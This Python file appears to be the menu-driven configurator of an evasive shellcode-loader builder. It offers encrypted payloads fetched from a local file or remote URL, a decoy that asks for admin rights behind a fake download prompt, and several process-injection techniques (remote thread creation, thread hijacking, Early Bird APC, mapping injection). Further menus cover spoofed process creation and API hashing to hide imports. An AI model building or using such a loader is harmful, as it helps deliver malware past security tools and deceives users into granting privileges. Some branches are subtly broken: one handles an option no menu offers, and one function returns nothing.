def set_payload_location():
    PayloadLocation = input("""\nSet Payload Location:
    1. Local File
    2. Remote Url
                            
    >> """)
    return PayloadLocation

def set_payload_path():
    PayloadPath = input("""\nSet Payload Path: 

    >> """)
    return PayloadPath

def set_payload_encryption():
    PayloadEncryption = input("""\nSet Payload  Obfuscation/Encryption:
    1. XOR
    2. RC4
    3. AES
    4. Plain (No Encryption)
                                       
    >> """)

    if PayloadEncryption == "7":
        PayloadEncryption = "null"
    elif PayloadEncryption == "1":
        PayloadEncryption = "XOR.h"
    elif PayloadEncryption == "2":
        PayloadEncryption = "RC4.h"
    elif PayloadEncryption == "3":
        PayloadEncryption = "AESEnc.h"
    elif PayloadEncryption == "4":
        PayloadEncryption = "null"

    return PayloadEncryption

def set_decoy():
    Decoy = input("""\nSet Decoy Function:
    1. Ask For Admin With Fake Download Message Box  
    2. No Decoy Function

    >> """)
    if Decoy == "1":
        Decoy = "DecoySpells/DecoyFunction.h"
    else:
        Decoy = "null"
    return Decoy

def set_url():
    Url = input("""\nSet Payload Url or type local For localhost:8000 (test): 

    >> """)
    if Url == "local":
        Url = "http://localhost:8000/payload.bin"
    return Url

def set_loader_type():
    Loader = input("""\nEnter Injection Techinque: 
    1. Local Injection
    2. Remote Process Injection

    >> """)
    return Loader

def set_local_loader_type():
    Loader = input("""\nEnter Injection Techinque: 
    1. Local Injection
    2. Local Thread Hijacking (Dummy Function)
    3. Local APC Injection
    4. Local Mapping Injection

    >> """)
    if Loader == "1":
        Loader = "LocalExecutionSpells/LocalInjection.h"
    if Loader == "2":
        Loader = "LocalExecutionSpells/LocalThreadHijacking.h"
    if Loader == "3":
        Loader = "LocalExecutionSpells/LocalApcInjection.h"
    if Loader == "4":
        Loader = "LocalExecutionSpells/LocalMappingInjection.h"
    return Loader

def set_remote_loader_type():
    Loader = input("""\nEnter Injection Techinque:
    1. Remote Process Injection - (CreateRemoteThread)
    2. Remote Thread Hijacking
    3. Early Bird APC Injection 
    4. Remote Mapping Injection
                       
    >> """)
    if Loader == "1":
        Loader = "RemoteExecutionSpells/RemoteInjection.h"
    if Loader == "2":
        Loader = "RemoteExecutionSpells/RemoteThreadHijacking.h"
    if Loader == "3":
        Loader = "RemoteExecutionSpells/EarlyBirdApcInjection.h"
    if Loader == "4":
        Loader = "RemoteExecutionSpells/RemoteMappingInjection.h"
    return Loader


def set_process_name():
    ProcessName = input("""\nEnter Process Name: 

    >> """)
    return ProcessName

def get_process_type():

    GetProcessType = input("""\nHow do you Want to Get Process ID:
    1. Create Process/Thread (Your Own Process)
    2. Enumerate Processes/Threads  (Remote Existent Process) 
    
    NOTE: DO NOT USE OPTION 2 WITH REMOTE THREAD HIJACKING AND APC INJECTION IF YOU ARE NOT AN ADULT!!

    >> """)
    return GetProcessType

def get_handle_type():
    GetHandle = input("""\nYou want to create or enumerate the remote process?
    1. Create
    2. Enumerate

    >> """)

def set_enum_type():
    Enumeration = input("""\nEnter Process/Thread Enumeration Techinque: 
    1. Process Enumeration via Snapshot
    2. Process Enumeration via NtQuerySystemInformation

    >> """)
    if Enumeration == "1":
        Enumeration = "EnumerationSpells/ProcessEnum32Snapshot.h"
    if Enumeration == "2":
        Enumeration = "EnumerationSpells/ProcessEnumNtQuerySysInfo.h"
    return Enumeration

def set_proc_creation_type():   
    Enumeration = input("""\nEnter Process Creation Type:
    1. Create Suspended Process
    2. Create Debugged Process
    3. Create Suspended (spoofed)
    4. Create Debugged (spoofed)

    >> """)
    if Enumeration == "1":
        Enumeration = "CreationSpells/CreateSuspended.h"
    if Enumeration == "2":
        Enumeration = "CreationSpells/CreateDebugged.h"
    if Enumeration == "3":
        Enumeration = "CreationSpells/CreateSuspendedSpoofed.h"
    if Enumeration == "4":
        Enumeration = "CreationSpells/CreateDebuggedSpoofed.h"
    return Enumeration

def set_api_mode():
    ApiMode = input("""\nSelect API Hashing Mode:
    1. Plain IAT
    2. IAT Hiding (No Hashing)
    3. Hashing (Rotr32)

    >> """)
    if ApiMode == "1":
        ApiMode = "UtilitySpells/ApiPlainIat.h"
    elif ApiMode == "2":
        ApiMode = "UtilitySpells/ApiNoHash.h"
    elif ApiMode == "3":
        ApiMode =  "UtilitySpells/ApiCtHash.h"
    return ApiMode